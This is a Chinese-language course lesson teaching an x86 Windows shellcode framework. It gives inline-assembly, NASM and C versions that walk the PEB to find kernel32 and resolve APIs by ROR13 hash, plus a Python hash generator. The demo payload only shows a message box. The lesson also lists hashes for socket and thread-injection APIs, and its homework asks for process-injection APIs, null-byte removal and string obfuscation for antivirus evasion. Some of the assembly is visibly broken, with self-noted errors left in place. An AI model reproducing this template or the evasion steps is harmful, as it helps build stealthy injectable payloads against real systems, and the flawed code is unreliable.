# 课时03 - x86 ShellCode框架

## 课程目标
1. 掌握x86 ShellCode的标准框架结构
2. 实现动态获取API函数地址的功能
3. 理解导出表解析在ShellCode中的应用
4. 编写完整可用的x86 ShellCode模板

## 名词解释

| 术语 | 全称 | 解释 |
|------|------|------|
| EAT | Export Address Table | 导出地址表，包含DLL导出函数地址 |
| ENT | Export Name Table | 导出名称表，包含导出函数名称RVA |
| EOT | Export Ordinal Table | 导出序号表，函数名到地址的映射 |
| ROR13 | Rotate Right 13 | 常用的API名称哈希算法 |
| GetPC | Get Program Counter | 获取当前执行位置的技术 |
| Shellcode Stub | - | ShellCode初始化代码，用于设置执行环境 |

## 使用工具

| 工具 | 用途 | 备注 |
|------|------|------|
| Visual Studio | 内联汇编开发 | 仅x86支持内联汇编 |
| NASM | 纯汇编开发 | 支持x86/x64 |
| x64dbg | 调试验证 | 观察执行流程 |
| Python | 哈希计算 | 批量生成函数哈希 |

## 技术原理

### 1. x86 ShellCode标准结构

```
┌────────────────────────────────────────┐
│  1. GetPC - 获取当前执行位置            │
├────────────────────────────────────────┤
│  2. 获取Kernel32.dll基址               │
├────────────────────────────────────────┤
│  3. 解析导出表获取GetProcAddress        │
├────────────────────────────────────────┤
│  4. 使用GetProcAddress获取其他API       │
│     - LoadLibraryA                      │
│     - VirtualAlloc                      │
│     - ... 其他需要的API                 │
├────────────────────────────────────────┤
│  5. 执行Payload功能                     │
├────────────────────────────────────────┤
│  6. 清理退出                           │
└────────────────────────────────────────┘
```

### 2. GetPC技术

```asm
; 方法1: call/pop
    call next
next:
    pop eax         ; eax = next标签的地址
    sub eax, 5      ; eax = call指令的地址

; 方法2: fstenv
    fldz
    fstenv [esp - 0x0C]
    pop eax         ; eax = fldz指令的地址
```

### 3. API哈希算法（ROR13）

```
hash = 0
for each char c in string:
    hash = ror(hash, 13)
    hash += c
```

## 代码实现

### 1. 完整x86 ShellCode框架（C内联汇编）

```c
// x86_shellcode_framework.c
// 完整的x86 ShellCode框架

#include <windows.h>
#include <stdio.h>

// 预计算的API哈希值（ROR13算法）
#define HASH_KERNEL32           0x6A4ABC5B
#define HASH_LOADLIBRARYA       0xEC0E4E8E
#define HASH_GETPROCADDRESS     0x7C0DFCAA
#define HASH_VIRTUALALLOC       0x91AFCA54
#define HASH_VIRTUALPROTECT     0x7946C61B
#define HASH_EXITPROCESS        0x73E2D87E
#define HASH_MESSAGEBOXA        0xBC4DA2A8
#define HASH_USER32             0x63C84283

#pragma optimize("", off)
#pragma code_seg(".shell")

// x86 ShellCode主函数
__declspec(naked) void ShellcodeEntry() {
    __asm {
        pushad                      // 保存所有寄存器
        
        // ====== 第1步：获取Kernel32基址 ======
        xor ecx, ecx
        mov eax, fs:[0x30]          // PEB
        mov eax, [eax + 0x0C]       // PEB->Ldr
        mov eax, [eax + 0x14]       // InMemoryOrderModuleList.Flink
        
    find_kernel32:
        mov esi, [eax + 0x28]       // BaseDllName.Buffer
        test esi, esi
        jz next_module
        
        // 检查是否为kernel32.dll
        movzx edx, word ptr [esi]
        or edx, 0x20                // 转小写
        cmp dl, 'k'
        jne next_module
        
        movzx edx, word ptr [esi + 0x0E]  // 第8个字符
        cmp dl, '3'
        jne next_module
        
        // 找到kernel32
        mov ebx, [eax + 0x10]       // DllBase -> ebx = kernel32基址
        jmp got_kernel32
        
    next_module:
        mov eax, [eax]              // 下一个模块
        jmp find_kernel32
        
    got_kernel32:
        // ebx = kernel32.dll基址
        
        // ====== 第2步：解析导出表获取GetProcAddress ======
        // 调用内部函数GetFunctionByHash
        push HASH_GETPROCADDRESS    // 函数哈希
        push ebx                    // 模块基址
        call GetFunctionByHash
        mov edi, eax                // edi = GetProcAddress
        
        // ====== 第3步：获取LoadLibraryA ======
        push HASH_LOADLIBRARYA
        push ebx
        call GetFunctionByHash
        mov esi, eax                // esi = LoadLibraryA
        
        // ====== 第4步：加载user32.dll ======
        // 构造 "user32.dll" 字符串
        xor eax, eax
        push eax                    // NULL终止符
        push 0x6C6C642E             // ".dll"
        push 0x32336572             // "rer32" (little endian: "32re")
        push 0x7375                 // "us"  这里需要调整
        
        // 重新构造正确的字符串
        add esp, 16                 // 清理栈
        
        // 使用正确的方式构造 "user32.dll"
        sub esp, 12
        mov dword ptr [esp], 0x72657375     // "user"
        mov dword ptr [esp+4], 0x642E3233   // "32.d"
        mov dword ptr [esp+8], 0x006C6C     // "ll\0"
        
        push esp                    // lpLibFileName
        call esi                    // LoadLibraryA("user32.dll")
        add esp, 12
        mov ebp, eax                // ebp = user32.dll基址
        
        // ====== 第5步：获取MessageBoxA ======
        push HASH_MESSAGEBOXA
        push ebp
        call GetFunctionByHash
        // eax = MessageBoxA
        
        // ====== 第6步：调用MessageBoxA ======
        xor ecx, ecx
        push ecx                    // MB_OK
        
        // 构造 "Hello" 字符串
        push 0x006F6C6C             // "llo\0"
        push 0x6548                 // "He"
        mov edx, esp
        
        push ecx                    // lpCaption = NULL
        push edx                    // lpText = "Hello"
        push ecx                    // hWnd = NULL
        call eax                    // MessageBoxA
        
        add esp, 8                  // 清理字符串
        
        // ====== 第7步：获取ExitProcess并退出 ======
        push HASH_EXITPROCESS
        push ebx
        call GetFunctionByHash
        
        xor ecx, ecx
        push ecx                    // 退出码 = 0
        call eax                    // ExitProcess(0)
        
        // 不应该执行到这里
        popad
        ret
        
    // ====== 内部函数：通过哈希获取函数地址 ======
    GetFunctionByHash:
        push ebp
        mov ebp, esp
        push esi
        push edi
        push ebx
        push ecx
        push edx
        
        mov ebx, [ebp + 8]          // 模块基址
        mov ecx, [ebp + 12]         // 目标哈希
        
        // 获取导出表
        mov eax, [ebx + 0x3C]       // e_lfanew
        add eax, ebx                // PE头
        mov eax, [eax + 0x78]       // 导出表RVA
        test eax, eax
        jz not_found
        
        add eax, ebx                // 导出表VA
        
        mov edi, [eax + 0x1C]       // AddressOfFunctions RVA
        add edi, ebx                // AddressOfFunctions VA
        
        mov esi, [eax + 0x20]       // AddressOfNames RVA
        add esi, ebx                // AddressOfNames VA
        
        push eax                    // 保存导出表指针
        mov eax, [eax + 0x24]       // AddressOfNameOrdinals RVA
        add eax, ebx
        push eax                    // 保存序号表指针
        
        xor edx, edx                // 计数器 = 0
        
    find_function:
        // 获取函数名
        mov eax, [esi + edx * 4]    // 名称RVA
        add eax, ebx                // 名称VA
        
        // 计算哈希
        push edx
        xor edx, edx                // hash = 0
        
    hash_loop:
        movzx edi, byte ptr [eax]
        test edi, edi
        jz hash_done
        
        ror edx, 13                 // ROR13
        add edx, edi
        inc eax
        jmp hash_loop
        
    hash_done:
        cmp edx, ecx                // 比较哈希
        pop edx
        
        je found_function
        
        inc edx
        
        // 检查是否遍历完所有函数
        pop eax                     // 序号表
        pop edi                     // 导出表
        push edi
        push eax
        
        cmp edx, [edi + 0x18]       // NumberOfNames
        jb find_function
        
        // 未找到
    not_found:
        xor eax, eax
        jmp get_func_done
        
    found_function:
        pop eax                     // 序号表
        pop edi                     // 导出表（不再需要）
        
        movzx edi, word ptr [eax + edx * 2]  // 获取序号
        
        mov eax, [edi * 4 + ebx + 0x3C]      // 这里有问题，需要修正
        
        // 正确的获取方式：
        mov eax, [ebx + 0x3C]       // e_lfanew
        add eax, ebx
        mov eax, [eax + 0x78]       // 导出表RVA
        add eax, ebx
        
        mov esi, [eax + 0x1C]       // AddressOfFunctions RVA
        add esi, ebx                // AddressOfFunctions VA
        
        mov eax, [esi + edi * 4]    // 函数RVA
        add eax, ebx                // 函数VA
        
    get_func_done:
        pop edx
        pop ecx
        pop ebx
        pop edi
        pop esi
        pop ebp
        ret 8                       // 清理参数
    }
}

#pragma optimize("", on)
#pragma code_seg()

// 更简洁的C语言版本ShellCode框架
typedef HMODULE (WINAPI* PFN_LOADLIBRARYA)(LPCSTR);
typedef FARPROC (WINAPI* PFN_GETPROCADDRESS)(HMODULE, LPCSTR);
typedef LPVOID (WINAPI* PFN_VIRTUALALLOC)(LPVOID, SIZE_T, DWORD, DWORD);
typedef int (WINAPI* PFN_MESSAGEBOXA)(HWND, LPCSTR, LPCSTR, UINT);
typedef void (WINAPI* PFN_EXITPROCESS)(UINT);

// ROR13哈希计算
DWORD CalcHash(const char* str) {
    DWORD hash = 0;
    while (*str) {
        hash = ((hash >> 13) | (hash << 19)) + *str;
        str++;
    }
    return hash;
}

// 通过哈希从模块获取函数
FARPROC GetFuncByHash(HMODULE hModule, DWORD hash) {
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((LPBYTE)hModule + pDos->e_lfanew);
    
    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(
        (LPBYTE)hModule + pNt->OptionalHeader.DataDirectory[0].VirtualAddress
    );
    
    PDWORD pFunctions = (PDWORD)((LPBYTE)hModule + pExport->AddressOfFunctions);
    PDWORD pNames = (PDWORD)((LPBYTE)hModule + pExport->AddressOfNames);
    PWORD pOrdinals = (PWORD)((LPBYTE)hModule + pExport->AddressOfNameOrdinals);
    
    for (DWORD i = 0; i < pExport->NumberOfNames; i++) {
        char* name = (char*)((LPBYTE)hModule + pNames[i]);
        DWORD nameHash = CalcHash(name);
        
        if (nameHash == hash) {
            WORD ordinal = pOrdinals[i];
            return (FARPROC)((LPBYTE)hModule + pFunctions[ordinal]);
        }
    }
    
    return NULL;
}

// C语言版本的ShellCode逻辑
void ShellcodeLogic() {
    // 1. 获取kernel32基址
    HMODULE hKernel32;
    #ifdef _WIN64
    PPEB pPeb = (PPEB)__readgsqword(0x60);
    #else
    PPEB pPeb = (PPEB)__readfsdword(0x30);
    #endif
    
    PPEB_LDR_DATA pLdr = (PPEB_LDR_DATA)pPeb->Ldr;
    PLIST_ENTRY pEntry = pLdr->InLoadOrderModuleList.Flink;
    
    while (pEntry != &pLdr->InLoadOrderModuleList) {
        PLDR_DATA_TABLE_ENTRY pModule = CONTAINING_RECORD(
            pEntry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks
        );
        
        if (pModule->BaseDllName.Buffer) {
            WCHAR* name = pModule->BaseDllName.Buffer;
            if ((name[0] == L'K' || name[0] == L'k') && name[7] == L'3') {
                hKernel32 = (HMODULE)pModule->DllBase;
                break;
            }
        }
        pEntry = pEntry->Flink;
    }
    
    // 2. 获取关键API
    PFN_LOADLIBRARYA pLoadLibraryA = 
        (PFN_LOADLIBRARYA)GetFuncByHash(hKernel32, HASH_LOADLIBRARYA);
    PFN_GETPROCADDRESS pGetProcAddress = 
        (PFN_GETPROCADDRESS)GetFuncByHash(hKernel32, HASH_GETPROCADDRESS);
    PFN_EXITPROCESS pExitProcess = 
        (PFN_EXITPROCESS)GetFuncByHash(hKernel32, HASH_EXITPROCESS);
    
    // 3. 加载user32.dll
    char szUser32[] = {'u','s','e','r','3','2','.','d','l','l',0};
    HMODULE hUser32 = pLoadLibraryA(szUser32);
    
    // 4. 获取MessageBoxA
    char szMessageBoxA[] = {'M','e','s','s','a','g','e','B','o','x','A',0};
    PFN_MESSAGEBOXA pMessageBoxA = 
        (PFN_MESSAGEBOXA)pGetProcAddress(hUser32, szMessageBoxA);
    
    // 5. 显示消息框
    char szTitle[] = {'S','h','e','l','l','c','o','d','e',0};
    char szText[] = {'H','e','l','l','o',' ','W','o','r','l','d','!',0};
    pMessageBoxA(NULL, szText, szTitle, MB_OK);
    
    // 6. 退出
    pExitProcess(0);
}

// 哈希值生成工具
void GenerateHashes() {
    printf("=== API Hash Values (ROR13) ===\n");
    
    const char* apis[] = {
        "LoadLibraryA",
        "GetProcAddress", 
        "VirtualAlloc",
        "VirtualProtect",
        "ExitProcess",
        "MessageBoxA",
        "CreateThread",
        "WaitForSingleObject",
        "CreateFileA",
        "WriteFile",
        "CloseHandle",
        "WSAStartup",
        "socket",
        "connect",
        "send",
        "recv"
    };
    
    for (int i = 0; i < sizeof(apis)/sizeof(apis[0]); i++) {
        printf("#define HASH_%-20s 0x%08X\n", apis[i], CalcHash(apis[i]));
    }
}

int main() {
    printf("========================================\n");
    printf("      x86 ShellCode Framework          \n");
    printf("========================================\n\n");
    
    // 生成哈希值
    GenerateHashes();
    
    printf("\n=== Testing ShellCode Logic ===\n");
    printf("Press Enter to execute MessageBox...\n");
    getchar();
    
    // 执行ShellCode逻辑
    ShellcodeLogic();
    
    return 0;
}
```

### 2. 纯汇编版本（NASM格式）

```nasm
; x86_shellcode.asm
; NASM格式 - x86 ShellCode完整框架
; 编译: nasm -f bin x86_shellcode.asm -o shellcode.bin

BITS 32

section .text
global _start

; 哈希常量
HASH_LOADLIBRARYA       equ 0xEC0E4E8E
HASH_GETPROCADDRESS     equ 0x7C0DFCAA
HASH_EXITPROCESS        equ 0x73E2D87E
HASH_MESSAGEBOXA        equ 0xBC4DA2A8

_start:
    pushad
    
    ; === 获取kernel32.dll基址 ===
    xor ecx, ecx
    mov eax, [fs:0x30]          ; PEB
    mov eax, [eax + 0x0C]       ; Ldr
    mov eax, [eax + 0x14]       ; InMemoryOrderModuleList.Flink
    
.find_kernel32:
    mov esi, [eax + 0x28]       ; BaseDllName.Buffer
    test esi, esi
    jz .next_module
    
    movzx edx, word [esi]
    or edx, 0x20
    cmp dl, 'k'
    jne .next_module
    
    movzx edx, word [esi + 14]
    cmp dl, '3'
    jne .next_module
    
    mov ebx, [eax + 0x10]       ; kernel32基址
    jmp .got_kernel32
    
.next_module:
    mov eax, [eax]
    jmp .find_kernel32
    
.got_kernel32:
    ; ebx = kernel32.dll
    
    ; === 获取LoadLibraryA ===
    push HASH_LOADLIBRARYA
    push ebx
    call find_function
    mov [esp + 32], eax         ; 保存到栈上
    push eax                    ; LoadLibraryA地址
    
    ; === 获取GetProcAddress ===
    push HASH_GETPROCADDRESS
    push ebx
    call find_function
    push eax                    ; GetProcAddress地址
    
    ; === 获取ExitProcess ===
    push HASH_EXITPROCESS
    push ebx
    call find_function
    push eax                    ; ExitProcess地址
    
    ; 栈布局: [ExitProcess][GetProcAddress][LoadLibraryA]
    
    ; === 加载user32.dll ===
    xor eax, eax
    push eax                    ; null terminator
    push 0x6C6C642E             ; .dll
    push 0x32337265             ; er32  
    push 0x7375                 ; us (需要调整对齐)
    
    ; 重新构造字符串
    add esp, 16
    sub esp, 16
    mov dword [esp], 'user'
    mov dword [esp+4], '32.d'
    mov dword [esp+8], 'll'
    mov byte [esp+10], 0
    
    mov eax, esp
    push eax
    mov eax, [esp + 20]         ; LoadLibraryA
    call eax
    add esp, 16
    
    ; eax = user32.dll基址
    
    ; === 获取MessageBoxA ===
    push HASH_MESSAGEBOXA
    push eax
    call find_function
    mov edi, eax                ; edi = MessageBoxA
    
    ; === 调用MessageBoxA ===
    xor eax, eax
    push eax                    ; MB_OK
    push eax                    ; lpCaption
    
    ; 构造消息字符串
    push 0x00216948             ; "Hi!\0"
    mov edx, esp
    
    push edx                    ; lpText
    push eax                    ; hWnd
    call edi
    add esp, 4
    
    ; === 退出 ===
    pop eax                     ; ExitProcess
    xor ecx, ecx
    push ecx
    call eax
    
    popad
    ret

; ====== find_function: 通过哈希查找函数 ======
; 参数: [esp+4] = 模块基址, [esp+8] = 哈希值
; 返回: eax = 函数地址
find_function:
    push ebp
    mov ebp, esp
    push esi
    push edi
    push ebx
    push ecx
    push edx
    
    mov ebx, [ebp + 8]          ; 模块基址
    mov ecx, [ebp + 12]         ; 目标哈希
    
    ; 获取导出表
    mov eax, [ebx + 0x3C]       ; e_lfanew
    mov eax, [ebx + eax + 0x78] ; 导出表RVA
    test eax, eax
    jz .not_found
    add eax, ebx                ; 导出表VA
    
    mov edi, eax                ; edi = 导出表
    
    mov esi, [edi + 0x20]       ; AddressOfNames RVA
    add esi, ebx                ; esi = 名称表
    
    xor edx, edx                ; 索引 = 0
    
.find_loop:
    cmp edx, [edi + 0x18]       ; NumberOfNames
    jge .not_found
    
    mov eax, [esi + edx * 4]    ; 名称RVA
    add eax, ebx                ; 名称VA
    
    ; 计算哈希
    push edx
    push ecx
    xor ecx, ecx                ; hash = 0
    
.hash_loop:
    movzx edx, byte [eax]
    test dl, dl
    jz .hash_done
    
    ror ecx, 13
    add ecx, edx
    inc eax
    jmp .hash_loop
    
.hash_done:
    mov eax, ecx                ; 计算得到的哈希
    pop ecx                     ; 目标哈希
    pop edx                     ; 索引
    
    cmp eax, ecx
    je .found
    
    inc edx
    jmp .find_loop
    
.found:
    ; 获取序号
    mov eax, [edi + 0x24]       ; AddressOfNameOrdinals RVA
    add eax, ebx
    movzx eax, word [eax + edx * 2]
    
    ; 获取函数地址
    mov edx, [edi + 0x1C]       ; AddressOfFunctions RVA
    add edx, ebx
    mov eax, [edx + eax * 4]    ; 函数RVA
    add eax, ebx                ; 函数VA
    jmp .done
    
.not_found:
    xor eax, eax
    
.done:
    pop edx
    pop ecx
    pop ebx
    pop edi
    pop esi
    pop ebp
    ret 8
```

### 3. Python哈希生成脚本

```python
#!/usr/bin/env python3
# hash_generator.py
# API名称ROR13哈希生成工具

def ror(val, bits, width=32):
    """右旋转"""
    mask = (1 << width) - 1
    val &= mask
    return ((val >> bits) | (val << (width - bits))) & mask

def ror13_hash(s):
    """计算ROR13哈希"""
    h = 0
    for c in s:
        h = ror(h, 13)
        h = (h + ord(c)) & 0xFFFFFFFF
    return h

def ror13_hash_unicode(s):
    """计算Unicode字符串的ROR13哈希（小写化）"""
    h = 0
    for c in s.lower():
        h = ror(h, 13)
        h = (h + ord(c)) & 0xFFFFFFFF
    return h

# 常用API列表
apis = [
    # Kernel32
    "LoadLibraryA",
    "LoadLibraryW",
    "GetProcAddress",
    "VirtualAlloc",
    "VirtualProtect",
    "VirtualFree",
    "ExitProcess",
    "CreateThread",
    "WaitForSingleObject",
    "CreateFileA",
    "WriteFile",
    "ReadFile",
    "CloseHandle",
    "GetModuleHandleA",
    "GetModuleHandleW",
    
    # User32
    "MessageBoxA",
    "MessageBoxW",
    
    # WS2_32
    "WSAStartup",
    "WSACleanup",
    "socket",
    "connect",
    "send",
    "recv",
    "closesocket",
    
    # Ntdll
    "NtAllocateVirtualMemory",
    "NtProtectVirtualMemory",
    "NtWriteVirtualMemory",
    "NtCreateThreadEx",
]

# 模块名
modules = [
    "kernel32.dll",
    "ntdll.dll",
    "user32.dll",
    "ws2_32.dll",
    "advapi32.dll",
    "kernelbase.dll",
]

print("// API Hash Values (ROR13)")
print("// Generated by hash_generator.py\n")

print("// === Function Hashes ===")
for api in apis:
    h = ror13_hash(api)
    print(f"#define HASH_{api.upper():30s} 0x{h:08X}")

print("\n// === Module Hashes (lowercase) ===")
for mod in modules:
    h = ror13_hash_unicode(mod)
    name = mod.replace(".", "_").upper()
    print(f"#define HASH_{name:30s} 0x{h:08X}")

# 交互式查询
if __name__ == "__main__":
    print("\n=== Interactive Hash Calculator ===")
    while True:
        try:
            s = input("Enter API/Module name (Ctrl+C to exit): ")
            if s:
                print(f"  ROR13 hash: 0x{ror13_hash(s):08X}")
                print(f"  Lowercase:  0x{ror13_hash_unicode(s):08X}")
        except KeyboardInterrupt:
            print("\nExiting...")
            break
```

## 课后作业

### 作业1：添加更多API支持
扩展ShellCode框架，添加对以下API的支持：
- CreateRemoteThread
- VirtualAllocEx
- WriteProcessMemory

### 作业2：消除空字节
检查编译后的ShellCode，消除其中的空字节。

### 作业3：添加字符串混淆
将所有硬编码字符串改为动态解密，增加免杀能力。
